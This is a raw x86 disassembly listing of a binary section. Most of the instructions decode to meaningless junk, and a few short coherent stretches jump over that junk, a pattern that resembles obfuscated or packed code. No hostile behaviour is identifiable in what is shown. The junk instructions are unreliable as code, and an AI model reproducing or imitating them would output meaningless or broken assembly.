  402172:	jg     0x4021f2
  402174:	jle    0x4021cc
  402176:	xor    edi,esp
  402178:	pop    eax
  402179:	jg     0x40213d
  40217b:	pop    ebp
  40217c:	sub    dh,BYTE PTR [ebx-0x5c60b8d5]
  402182:	mov    edx,0x2eb7b045
  402187:	mov    dh,0x1f
  402189:	fild   DWORD PTR [eax-0x61]
  40218c:	mov    esp,0x3aa5dbac
  402191:	cmp    esi,eax
  402193:	adc    BYTE PTR [ebx-0x110daced],ah
  402199:	ins    DWORD PTR es:[edi],dx
  40219a:	test   eax,0x5a92cc34
  40219f:	pop    ds
  4021a0:	mov    al,ds:0xf4477a12
  4021a5:	push   es
  4021a6:	test   eax,0x4eda1cf6
  4021ab:	stc    
  4021ac:	jmp    0x4021a5
  4021ae:	into   
  4021af:	inc    ebx
  4021b0:	mov    ds:0xc242ce82,eax
  4021b5:	jmp    0x188a:0x10e277a9
  4021bc:	xor    ch,BYTE PTR [ebx+0x2c982502]
  4021c2:	push   ecx
  4021c3:	mov    eax,ds:0x6f4fab88
  4021c8:	jnp    0x245d813e
  4021ce:	cld    
  4021cf:	pop    ds
  4021d0:	mov    edi,0xe5aa6d66
  4021d5:	dec    edx
  4021d6:	fdiv   QWORD PTR cs:[esi+0x15d49ef1]
  4021dd:	xchg   esi,eax
  4021de:	out    dx,al
  4021df:	repz out 0x86,eax
  4021e2:	mov    cl,0xf9
  4021e4:	mov    ecx,0x9534ea41
  4021e9:	pop    esp
  4021eb:	jno    0x4021d2
  4021ed:	imul   ebx,DWORD PTR [ecx-0x15],0xf7fc7488
  4021f4:	push   es
  4021f5:	cs jmp 0xc922:0x18ba2a8e
  4021fd:	repz repnz test bh,ch
  402201:	cmp    eax,0x39c0e52
  402206:	adc    al,0x30
  402208:	rcr    dh,cl
  40220a:	pop    edx
  40220b:	sub    BYTE PTR [ecx-0x9],al
  40220e:	push   eax
  40220f:	sbb    al,BYTE PTR [edx-0xe]
  402212:	(bad)  
  402213:	into   
  402214:	pushf  
  402215:	les    esp,FWORD PTR [ebx+0x361a9bc1]
  40221b:	cwde   
  40221c:	or     eax,0xffffffad
  40221f:	(bad)  
  402220:	(bad)  
  402221:	jge    0x4021c4
  402223:	hlt    
  402224:	jo     0x4021fd
  402226:	mov    bh,0xd7
  402228:	test   al,0x3e
  40222a:	in     eax,0x43
  40222c:	adc    bl,ah
  40222e:	ja     0x402275
  402230:	jg     0x4022aa
  402232:	gs jge 0x402240
  402235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402236:	mov    esp,0x516808a4
  40223b:	addr16 mov cl,0x23
  40223e:	retf   
  40223f:	fbld   TBYTE PTR ss:[ebx]
  402242:	xchg   edi,eax
  402243:	nop
  402244:	clc    
  402245:	(bad)
  402249:	inc    eax
  40224a:	fcom   DWORD PTR [eax+0x1b54c88e]
  402250:	fs popa 
  402252:	jl     0x40226c
  402254:	cmc    
  402255:	pop    edi
  402256:	pusha  
  402257:	fcmove st,st(7)
  402259:	in     eax,dx
  40225a:	xchg   edi,eax
  40225b:	mov    al,0x58
  40225d:	loop   0x4021f7
  40225f:	mov    ebp,0x1b7dc3f2
  402264:	call   0xd77ca11a
  402269:	mov    al,ds:0x3580d1fb
  40226e:	and    esi,edx
  402270:	rcl    DWORD PTR [eax+0x35],1
  402273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402274:	cmp    eax,0x77985bd9
  402279:	or     ah,dh
  40227b:	sbb    al,0xb8
  40227d:	push   eax
  40227e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40227f:	cld    
  402280:	or     al,0x49
  402282:	adc    ch,BYTE PTR [edi]
  402284:	aas    
  402285:	cs out 0xb0,eax
  402288:	push   esi
  402289:	(bad)  
  40228a:	mov    ebp,0x9692b21b
  40228f:	push   esi
  402290:	repnz sub al,BYTE PTR [edx+edx*1+0x29399e02]
  402298:	(bad)  
  402299:	xlat   BYTE PTR ds:[ebx]
  40229a:	pop    esi
  40229b:	cmovb  ecx,DWORD PTR ds:0x34802ee2
  4022a2:	js     0x4022fe
  4022a4:	cli    
  4022a5:	xchg   edx,eax
  4022a6:	xor    al,0xf7
  4022a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022a9:	and    BYTE PTR [edx+0x76b24bb1],ah
  4022af:	cmp    DWORD PTR [edi-0x55],0xffffffdf
  4022b3:	lahf   
  4022b4:	rol    ebp,1
  4022b6:	or     al,0x28
  4022b8:	aas    
  4022b9:	sbb    eax,0x54c165b5
  4022be:	add    DWORD PTR [edi-0x3b],ecx
  4022c1:	push   ebx
  4022c2:	ja     0x402270
  4022c4:	jp     0x4022aa
  4022c6:	add    esi,edi
  4022c8:	mov    bl,0x5b
  4022ca:	lock (bad) 
  4022cc:	push   ds
  4022cd:	sbb    eax,DWORD PTR [edx+0xf]
  4022d0:	or     ebx,DWORD PTR [eax]
  4022d2:	or     DWORD PTR [edx+0x4d],0x3f848bcd
  4022d9:	ret    0x7c3b
  4022dc:	cdq    
  4022dd:	rcr    DWORD PTR [ecx-0x66bdf53c],cl
  4022e3:	mov    ds:0x2904b2d6,al
  4022e8:	(bad)  
  4022e9:	xor    al,0x25
  4022eb:	adc    edx,DWORD PTR [ecx-0xc]
  4022ee:	jge    0x40230d
  4022f0:	enter  0xb58f,0x12
  4022f4:	fnsave [ecx-0x1a]
  4022f7:	js     0x40236f
  4022f9:	push   eax
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	stos   DWORD PTR es:[edi],eax
  402358:	push   ss
  402359:	sbb    BYTE PTR [edx+0x7e7e039a],ch
  40235f:	cli    
  402360:	jg     0x4023e0
  402362:	jle    0x402309
  402364:	pop    edx
  402365:	sub    BYTE PTR [edx-0x3a],dh
  402368:	add    ax,0x4026
  40236c:	int    0xfe
  40236e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40236f:	aad    0x3b
  402371:	jmp    0xdc33:0x38fefd07
  402378:	or     ebp,DWORD PTR [ebx+0x3a]
  40237b:	and    DWORD PTR [ebx-0x53],ebp
  40237e:	sbb    DWORD PTR [ecx+0x5bb60fd5],edx
  402384:	loopne 0x4023d2
  402386:	inc    ebp
  402387:	ret    0x5313
  40238a:	mov    esi,0x45d32a12
  40238f:	pop    edx
  402390:	adc    eax,0x4abef1a4
  402395:	xchg   ecx,eax
  402396:	out    0x71,eax
  402398:	ja     0x402403
  40239a:	and    al,0x34
  40239c:	jg     0x402399
  40239e:	mov    ecx,0x82366969
  4023a3:	inc    ecx
  4023a4:	cmp    DWORD PTR es:[edi],esp
  4023a7:	retf   0xf532
  4023aa:	mov    ebx,0x4db813e8
  4023af:	in     al,0xeb
  4023b1:	sbb    edi,ecx
  4023b3:	ffree  st(1)
  4023b5:	ds adc al,0x9
  4023b8:	aaa    
  4023b9:	in     eax,dx
  4023ba:	sbb    al,0x6b
  4023bc:	pop    esp
  4023bd:	cwde   
  4023be:	ret    0xea41
  4023c1:	push   ds
  4023c2:	xor    eax,0xd7e83feb
  4023c7:	hlt    
  4023c8:	int    0x60
  4023ca:	pusha  
  4023cb:	nop
  4023cc:	ret    
  4023cd:	mov    ch,al
  4023cf:	jne    0x4023c8
  4023d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023d2:	aad    0x16
  4023d4:	mov    bl,0x21
  4023d6:	popa   
  4023d7:	ret    0xc692
  4023da:	outs   dx,DWORD PTR ds:[esi]
  4023db:	mov    edx,0xe5da37ed
  4023e0:	cwde   
  4023e1:	and    bl,BYTE PTR ds:0xddecbcf0
  4023e7:	ret    0xfa72
  4023ea:	dec    ecx
  4023eb:	inc    ecx
  4023ec:	xor    DWORD PTR [ecx+0x11131e1d],ecx
  4023f2:	jl     0x402383
  4023f4:	lock es push ecx
  4023f7:	imul   edx,eax,0x5f
  4023fa:	hlt    
  4023fb:	push   ebx
  4023fc:	enter  0xefe3,0xb
  402400:	xchg   BYTE PTR [ebx],dh
  402402:	xor    BYTE PTR [edi+0x1ccdaa51],cl
  402408:	imul   bl
  40240a:	mov    al,0x33
  40240c:	mov    BYTE PTR ds:0x6ad1,bh
  402411:	(bad)  
  402412:	mov    eax,0x75ef9d38
  402417:	fild   QWORD PTR [eax+edx*4+0x72]
  40241b:	les    eax,FWORD PTR [edx+0x10]
  40241e:	inc    eax
  40241f:	call   0x55d1ec0b
  402424:	inc    edi
  402425:	and    dl,BYTE PTR [edx-0x325b1e26]
  40242b:	push   edi
  40242c:	xchg   ecx,eax
  40242d:	mov    ds,WORD PTR [ebx+0x38516ed0]
  402433:	sti    
  402434:	add    DWORD PTR [eax+0x23e7346e],0xffffffd5
  40243b:	pop    ebx
  40243c:	sbb    eax,0xdada1485
  402441:	cli    
  402442:	xchg   esi,eax
  402443:	sub    al,0x4e
  402445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402446:	push   edx
  402447:	aam    0x24
  402449:	cmp    DWORD PTR [esi-0x6321493d],0xffffffaa
  402450:	xor    edx,DWORD PTR [ebx+0x63cbe732]
  402456:	mov    cl,0x1c
  402458:	add    al,0x2b
  40245a:	push   sp
  40245c:	imul   edx,DWORD PTR [eax],0x4cbbc299
  402462:	push   edx
  402463:	bnd ret 
  402465:	(bad)
  402468:	pop    ebp
  402469:	rol    BYTE PTR [eax+0x37],1
  40246c:	inc    ecx
  40246d:	or     al,0x39
  40246f:	ja     0x40248c
  402471:	lea    ebp,[esi-0x5c]
  402474:	pop    ebx
  402475:	imul   edi,DWORD PTR [edi+0x23cf411],0xada842a5
  40247f:	sub    edx,edi
  402481:	imul   eax,DWORD PTR ds:0x10bbf71b,0x68
  402488:	(bad)  
  402489:	jmp    0xa450b487
  40248e:	cmc    
  40248f:	cmp    al,0x88
  402491:	or     ch,0xc
  402494:	neg    al
  402496:	out    0xf5,al
  402498:	fdivr  QWORD PTR [ebx]
  40249a:	push   edx
  40249b:	loope  0x40247e
  40249d:	js     0x402446
  40249f:	out    dx,eax
  4024a0:	dec    esp
  4024a1:	inc    ebx
  4024a2:	sar    DWORD PTR [eax],cl
  4024a4:	pop    ecx
  4024a5:	push   esp
  4024a6:	push   ds
  4024a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024a8:	xchg   esp,eax
  4024a9:	push   ecx
  4024aa:	scas   al,BYTE PTR es:[edi]
  4024ab:	push   0xffffffaf
  4024ad:	cwde   
  4024ae:	pop    esp
  4024af:	stos   BYTE PTR es:[edi],al
  4024b0:	test   al,0x28
  4024b2:	loope  0x40246d
  4024b4:	pop    ds
  4024b5:	out    dx,eax
  4024b6:	mov    edx,0xc6fee8a2
  4024bb:	lahf   
  4024bc:	sub    al,0xd8
  4024be:	jae    0x40246f
  4024c0:	push   0x318f2f05
  4024c5:	repz cmp cl,BYTE PTR ds:0x20439d4
  4024cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024cd:	push   ebp
  4024ce:	jb     0x4024bd
  4024d0:	dec    edi
  4024d1:	jo     0x402463
  4024d3:	shl    DWORD PTR [eax-0x9],0xaa
  4024d7:	(bad)  
  4024d8:	ja     0x40245b
  4024da:	pop    ebp
  4024db:	ror    BYTE PTR [eax-0x3a],1
  4024de:	xchg   ecx,eax
  4024df:	dec    ebx
  4024e0:	cmp    BYTE PTR [esi],0xdb
  4024e3:	loop   0x402481
  4024e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024e6:	sbb    eax,0x89f0458b
  4024eb:	inc    ebp
  4024ec:	lock mov eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	xor    dh,BYTE PTR [ebx+ebx*8+0x7e0126fd]
  402514:	jle    0x402510
  402516:	jg     0x402596
  402518:	jle    0x40253b
  40251a:	jo     0x4024ef
  40251c:	dec    esp
  40251d:	adc    DWORD PTR [ebx-0x3cc1ecb2],ecx
  402523:	xchg   BYTE PTR [eax+0x3c],bh
  402526:	mov    esi,0xdf1fadb5
  40252b:	enter  0xe123,0x2f
  40252f:	cmp    BYTE PTR [ebx+esi*1],bh
  402532:	addr16 jge 0x4024fe
  402535:	fmul   st,st(4)
  402537:	out    0xa,eax
  402539:	ja     0x4024ff
  40253b:	inc    esp
  40253c:	ja     0x40257a
  40253e:	jne    0x86bc6cd2
  402544:	test   eax,0x64c5c8e9
  402549:	(bad)  
  40254a:	or     eax,0xf290f3a0
  40254f:	mov    ah,dh
  402551:	les    eax,FWORD PTR [edx-0x693794db]
  402557:	cmp    DWORD PTR [ebx-0x23],edx
  40255a:	enter  0x254d,0x69
  40255e:	xor    al,al
  402560:	or     eax,edx
  402562:	(bad)  
  402563:	test   DWORD PTR [ecx],0x9e0a13e9
  402569:	or     al,0x62
  40256b:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40256d:	(bad)  
  40256e:	popa   
  40256f:	scas   al,BYTE PTR es:[edi]
  402570:	xchg   ecx,eax
  402571:	in     eax,0xe2
  402573:	ret    0x2d42
  402576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402579:	fdivr  DWORD PTR ss:[edx-0x64b03da4]
  402580:	(bad)  
  402581:	sub    eax,0x2950
  402586:	out    dx,eax
  402587:	hlt    
  402588:	push   DWORD PTR [ecx-0x1c8c8cf3]
  40258e:	or     al,0x86
  402591:	mov    dh,0xe2
  402593:	rcl    BYTE PTR [esp+edx*4],cl
  402596:	inc    ecx
  402597:	adc    edi,edi
  402599:	ja     0x402569
  40259b:	fisttp DWORD PTR [ebx+0x35]
  40259e:	mov    bh,0xbe
  4025a0:	ret    0xb460
  4025a3:	mov    edx,0x44943724
  4025a8:	inc    eax
  4025a9:	inc    edx
  4025aa:	cs (bad) 
  4025ae:	and    dl,cl
  4025b0:	stos   DWORD PTR es:[edi],eax
  4025b1:	add    al,0x51
  4025b3:	ss test ah,ah
  4025b6:	add    ebx,DWORD PTR [ebx+0x4c51427f]
  4025bc:	cmp    al,0x72
  4025be:	lds    esi,FWORD PTR [edx]
  4025c0:	enter  0x837c,0xed
  4025c4:	sbb    DWORD PTR [ebx-0x3a206bdd],0x29
  4025cb:	xor    DWORD PTR [ebx-0x6e],ebp
  4025ce:	adc    eax,0x61b47b6c
  4025d3:	cmc    
  4025d4:	dec    ebx
  4025d5:	pop    eax
  4025d6:	xchg   cl,bl
  4025d8:	js     0x4025cd
  4025da:	pop    eax
  4025db:	out    0xb,eax
  4025dd:	leave  
  4025de:	fdiv   st,st(6)
  4025e0:	frstor [edi+0x7d3792f0]
  4025e6:	nop
  4025e7:	push   ds
  4025e8:	push   eax
  4025e9:	mov    dh,0xb5
  4025eb:	jmp    0x40263f
  4025ed:	ds inc ebp
  4025ef:	pop    ds
  4025f0:	cmp    esp,esi
  4025f2:	out    dx,al
  4025f3:	outs   dx,DWORD PTR ds:[esi]
  4025f4:	jmp    0x32036105
  4025f9:	(bad)  
  4025fb:	dec    eax
  4025fc:	dec    ebp
  4025fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025fe:	jbe    0x40264b
  402600:	sahf   
  402601:	ret    0xaa79
  402604:	mov    dl,0xd2
  402606:	adc    dh,BYTE PTR [eax+0x2f]
  402609:	outs   dx,DWORD PTR ds:[esi]
  40260a:	(bad)  
  40260b:	mov    cl,0xdc
  40260d:	mov    ebp,0x945d1c8
  402612:	call   0xb142:0x6036a2b
  402619:	cmp    eax,0x755cd6e4
  40261e:	adc    eax,0xfd68a9df
  402623:	mov    ecx,DWORD PTR [esi]
  402625:	mov    esp,cs
  402627:	sbb    cl,BYTE PTR [edi+0x5c]
  40262a:	lock cli 
  40262c:	cmp    eax,0x7a48d26d
  402631:	scas   eax,DWORD PTR es:[edi]
  402632:	mov    fs,ebp
  402634:	in     al,0x75
  402636:	adc    al,0x19
  402638:	jnp    0x4025e8
  40263a:	int3   
  40263b:	test   eax,0x7aa1d011
  402641:	adc    eax,0x828a8428
  402646:	out    dx,al
  402647:	xchg   esi,eax
  402648:	dec    ebx
  402649:	and    al,0x3e
  40264b:	popf   
  40264c:	cmp    ch,BYTE PTR [edi]
  40264e:	sbb    DWORD PTR [edi+0x14b079cc],ecx
  402654:	lods   al,BYTE PTR ds:[esi]
  402655:	xchg   DWORD PTR [ecx],edx
  402657:	cmp    BYTE PTR ds:0x9b990d66,dh
  40265d:	sbb    eax,0xa9e95098
  402662:	ret    0xdcb6
  402665:	out    dx,al
  402666:	daa    
  402667:	sub    edi,DWORD PTR es:[esi+0x2a920513]
  40266e:	aad    0x7b
  402670:	pop    ds
  402671:	jge    0x40265e
  402673:	fisubr DWORD PTR [edi+eax*4+0x7c]
  402677:	icebp  
  402678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402679:	sbb    eax,ecx
  40267b:	cli    
  40267c:	clc    
  40267d:	pusha  
  40267e:	scas   eax,DWORD PTR es:[edi]
  40267f:	out    dx,eax
  402680:	popa   
  402681:	mov    BYTE PTR ss:[ebx-0x32007f76],cl
  402688:	jge    0x402679
  40268a:	ss mov ecx,esp
  40268d:	je     0x402624
  40268f:	jmp    0x40265e
  402691:	push   edx
  402692:	cmp    al,0x32
  402694:	out    0x8,eax
  402696:	sub    ch,ch
  402698:	mov    ch,0xde
  40269a:	xor    eax,0xc633d77f
  40269f:	add    eax,0x32729b
  4026a4:	mov    DWORD PTR [ecx],eax
  4026a6:	mov    eax,DWORD PTR [ebp-0x24]
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	and    DWORD PTR [edi],esi
  4026d4:	and    al,0x49
  4026d6:	mov    ds:0xfa7e7e0e,al
  4026db:	jg     0x40275b
  4026dd:	jle    0x402703
  4026df:	xchg   DWORD PTR ds:0xe6f19091,ecx
  4026e5:	inc    ebx
  4026e6:	push   esi
  4026e7:	xor    dh,BYTE PTR [edi-0x51070a9f]
  4026ed:	mov    al,ds:0xd791423a
  4026f2:	test   DWORD PTR [eax-0x8d12f78],esp
  4026f8:	cwde   
  4026f9:	inc    ecx
  4026fa:	mov    ds:0x1c861634,al
  4026ff:	call   0x2ef44869
  402704:	inc    ecx
  402705:	dec    ecx
  402706:	fldcw  WORD PTR [ebx+ebx*1-0x25]
  40270a:	into   
  40270b:	les    ecx,FWORD PTR [edi]
  40270d:	outs   dx,BYTE PTR ds:[esi]
  40270e:	mov    es:0x53f170ea,eax
  402714:	mov    esi,DWORD PTR [edi]
  402716:	adc    DWORD PTR [ecx],ebx
  402718:	ja     0x402760
  40271a:	xor    BYTE PTR [esi],0xde
  40271d:	cdq    
  40271e:	mov    esp,0xfb7fa402
  402723:	ins    DWORD PTR es:[edi],dx
  402724:	xlat   BYTE PTR ds:[ebx]
  402725:	push   ecx
  402726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402727:	gs pop esi
  402729:	push   ebx
  40272a:	mov    ebp,0x9f0bcd01
  40272f:	mov    BYTE PTR [ebx],dl
  402731:	das    
  402732:	out    0xff,al
  402734:	xchg   esi,eax
  402735:	sub    ecx,DWORD PTR [esi+0x4a]
  402738:	jp     0x40275e
  40273a:	fimul  DWORD PTR [esp+edi*2]
  40273d:	lods   eax,DWORD PTR ds:[esi]
  40273e:	pusha  
  40273f:	or     al,0x7b
  402741:	mov    cl,0xe3
  402743:	sbb    al,0xcc
  402745:	inc    edx
  402747:	xor    bl,BYTE PTR [edx]
  402749:	xchg   BYTE PTR [edi],bl
  40274b:	jmp    0xbebe:0x5675e19a
  402752:	mov    eax,DWORD PTR [edi+eiz*2]
  402755:	lds    esp,FWORD PTR [ebx-0x45]
  402758:	inc    edx
  402759:	das    
  40275a:	jmp    0x1328:0xc12b2598
  402761:	das    
  402762:	or     esi,DWORD PTR [edx+0x5a7737d9]
  402768:	push   ecx
  402769:	xlat   BYTE PTR ds:[ebx]
  40276a:	push   ebp
  40276b:	sub    bh,bh
  40276d:	ss add al,ah
  402770:	repz in eax,dx
  402772:	bound  edx,QWORD PTR [ebp+0x76a1805a]
  402778:	push   ds
  402779:	stos   BYTE PTR es:[edi],al
  40277a:	xor    BYTE PTR [ebp+0xc],0xe5
  40277e:	(bad)  
  40277f:	daa    
  402780:	cs (bad) 
  402782:	popf   
  402783:	cmp    al,0x72
  402785:	rol    BYTE PTR [eax+0x708278bf],0x8e
  40278c:	pop    esp
  40278d:	hlt    
  40278e:	push   ebp
  40278f:	js     0x402754
  402791:	stc    
  402792:	icebp  
  402793:	cmp    eax,0x60923f7d
  402798:	lock sbb dh,bl
  40279b:	out    dx,eax
  40279c:	mov    esi,0xbcef9aba
  4027a1:	call   0xc07a1391
  4027a6:	mov    ecx,0x9a02c6c
  4027ab:	shl    DWORD PTR [esi],0xda
  4027ae:	add    ch,bh
  4027b0:	icebp  
  4027b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027b2:	test   eax,0xf2bf2be
  4027b7:	les    ebp,FWORD PTR [ebp-0x113fa3e3]
  4027bd:	mov    esp,0xcb04465f
  4027c2:	or     BYTE PTR [ebx-0x5d5184e4],ch
  4027c8:	mov    edi,DWORD PTR [edx+0x2f]
  4027cb:	pop    ecx
  4027cc:	push   ecx
  4027cd:	mov    al,ds:0xb6e82418
  4027d2:	xchg   edx,eax
  4027d3:	sub    al,0x68
  4027d5:	push   0x24251c92
  4027da:	shl    BYTE PTR [esi+ecx*4-0x1160de09],1
  4027e1:	pop    ss
  4027e2:	(bad)  
  4027e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027e4:	push   ecx
  4027e5:	jo     0x402823
  4027e7:	data16 jge 0x4027ab
  4027ea:	mov    dh,0x6e
  4027ec:	dec    edx
  4027ed:	dec    esi
  4027ee:	test   BYTE PTR [ebx+0x18146508],dl
  4027f4:	push   eax
  4027f5:	or     BYTE PTR [edi+ecx*2-0xc],dl
  4027f9:	cmp    esi,eax
  4027fb:	push   edi
  4027fc:	out    0xa2,eax
  4027fe:	rol    BYTE PTR [eax+0x7b1d8222],0xe6
  402805:	retf   0x27b3
  402808:	std    
  402809:	pop    edi
  40280a:	sbb    ecx,edi
  40280c:	icebp  
  40280d:	stos   WORD PTR es:[edi],ax
  40280f:	clc    
  402810:	or     al,0xe6
  402812:	es mov esi,esi
  402815:	cwde   
  402816:	cmp    eax,0xa6cc010f
  40281b:	and    ah,BYTE PTR [edi+0x2110c6ec]
  402821:	xchg   esp,eax
  402822:	loop   0x402817
  402824:	cmc    
  402825:	xlat   BYTE PTR ds:[ebx]
  402826:	cld    
  402827:	pop    esp
  402828:	in     eax,0xf1
  40282a:	push   edx
  40282b:	out    dx,eax
  40282c:	push   ebp
  40282d:	outs   dx,BYTE PTR ds:[esi]
  40282e:	fsub   QWORD PTR [edx+eax*2]
  402831:	or     ebx,DWORD PTR cs:0x5d194d6a
  402838:	and    esi,DWORD PTR ds:0x10e9ea0b
  40283f:	inc    edx
  402840:	push   ebp
  402841:	fstp   TBYTE PTR [ecx+eax*2]
  402844:	sbb    DWORD PTR [edi-0x1d],0x5e
  402848:	loopne 0x40289e
  40284a:	mov    esp,0x7c24ff65
  40284f:	mov    dl,0x6c
  402851:	in     al,0x55
  402853:	imul   edx,DWORD PTR [esi+0x562f03de],0xc69e407f
  40285d:	sbb    eax,0x5ab8e3bc
  402862:	mov    eax,DWORD PTR [ebp-0x30]
  402865:	mov    ecx,DWORD PTR [ebp-0x8]
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	pop    ebx
  402884:	outs   dx,BYTE PTR ds:[esi]
  402885:	sbb    eax,0x7e0c2eab
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x40284c
  402890:	call   0x8047:0x2f69a98a
  402897:	in     al,0x6a
  402899:	push   ebx
  40289a:	es pop esp
  40289c:	mov    gs,edi
  40289e:	add    al,0xf6
  4028a0:	xor    esp,esi
  4028a2:	sbb    DWORD PTR [edi],edi
  4028a4:	cli    
  4028a5:	rcl    DWORD PTR [ecx+0x1627a7e3],1
  4028ab:	and    eax,DWORD PTR [eax-0x3dcdb827]
  4028b1:	dec    ebp
  4028b2:	call   0x176db299
  4028b7:	jns    0x40290e
  4028b9:	jmp    0x40292f
  4028bb:	pop    ebx
  4028bc:	rol    BYTE PTR [ecx+0x39],cl
  4028bf:	loop   0x402903
  4028c1:	arpl   WORD PTR [edx],si
  4028c3:	or     al,ch
  4028c5:	pop    ds
  4028c6:	or     BYTE PTR [edi-0x33867e2c],0x36
  4028cd:	adc    DWORD PTR [ebx],ebx
  4028cf:	mov    ebp,0xbff1c892
  4028d4:	sbb    BYTE PTR [edi-0x4],0x64
  4028d8:	sbb    al,0xde
  4028da:	sub    eax,0xd14e3a8e
  4028df:	cdq    
  4028e0:	add    eax,0x5105a1f4
  4028e5:	ficomp WORD PTR [edx]
  4028e7:	and    eax,0x6172b24f
  4028ec:	fcom   QWORD PTR [eax+esi*8]
  4028ef:	ins    DWORD PTR es:[edi],dx
  4028f0:	dec    eax
  4028f1:	popa   
  4028f2:	dec    edx
  4028f3:	inc    esp
  4028f4:	push   esp
  4028f5:	mov    dh,0xc2
  4028f7:	add    BYTE PTR [ecx+0x2250e7b5],al
  4028fd:	jns    0x40288a
  4028ff:	mov    cl,0x3e
  402901:	imul   edx,DWORD PTR [ecx],0x1df3f23a
  402907:	push   ebx
  402908:	mov    cl,0x23
  40290a:	enter  0x4b1b,0xde
  40290e:	mov    ch,0xfe
  402910:	jns    0x40290c
  402912:	and    cl,ch
  402914:	fistp  DWORD PTR [eax-0x7fbd595e]
  40291a:	push   0x75bf80a2
  40291f:	jl     0x4028aa
  402921:	(bad)  
  402922:	lock pop esi
  402924:	add    al,0x26
  402926:	pop    edx
  402927:	into   
  402928:	cs push ecx
  40292a:	mov    esi,0xacff6494
  40292f:	mov    esi,0xe6f1e3e8
  402934:	lea    ecx,[ebx+esi*2]
  402937:	fdivr  DWORD PTR [ebx+0x4fead5f7]
  40293d:	sub    edi,0x1034e7fc
  402943:	int    0xab
  402945:	dec    eax
  402946:	inc    ebp
  402947:	mov    ds:0xe42336be,eax
  40294c:	leave  
  40294d:	imul   edx,edi,0x51eb0a35
  402953:	xchg   edi,eax
  402954:	fs cmp al,0x98
  402957:	jp     0x4028f1
  402959:	inc    edi
  40295a:	push   ds
  40295b:	es enter 0x915c,0x32
  402960:	sahf   
  402961:	cmp    cl,BYTE PTR [ebp-0x4851725b]
  402967:	mov    al,ds:0xf7d4895c
  40296c:	mov    ds:0xb686dbe5,eax
  402971:	jne    0x40290b
  402973:	dec    ebx
  402974:	aam    0x91
  402976:	xlat   BYTE PTR ds:[ebx]
  402977:	aad    0x1b
  402979:	add    BYTE PTR [edi+edx*1],0xc8
  40297d:	pop    ebx
  40297e:	jae    0x402985
  402980:	push   cs
  402981:	mov    bh,0x63
  402983:	adc    DWORD PTR [ecx],edx
  402985:	adc    DWORD PTR [ecx-0x7],edi
  402988:	push   eax
  402989:	sahf   
  40298a:	test   BYTE PTR [eax+0x21],al
  40298d:	jp     0x4029d8
